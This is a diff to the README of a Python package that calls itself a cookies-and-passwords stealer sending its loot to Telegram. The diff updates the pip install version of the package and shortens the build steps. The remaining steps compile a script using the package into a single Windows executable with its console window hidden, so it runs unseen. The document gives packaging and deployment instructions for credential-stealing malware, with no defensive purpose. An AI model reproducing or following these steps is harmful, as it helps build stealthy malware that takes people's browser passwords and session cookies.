@@ -54,7 +54,7 @@ Cookies and passwords stealer in just 2 lines. Sending to Telegram.
 
 You can install the latest version with the command:
 ```
-pip install stink==1.0.0
+pip install stink==1.0.1
 ```
 
 ## Example usage
@@ -156,12 +156,9 @@ venv\Scripts\activate
 pip install Nuitka==0.6.16.4
 ```
 ```
-pip install stink==1.0.0
+pip install stink==1.0.1
 ```
-6. In the appearing folder venv go to the path `\Lib\site-packages\win32\`.
-7. Copy the file `win32crypt.pyd`.
-8. Paste it in the path `\Lib\site-packages\`.
-9. Go back to `cmd` and write the command:
+6. Write the command:
 ```
 nuitka --onefile --windows-disable-console --include-package=stink test.py
 ```
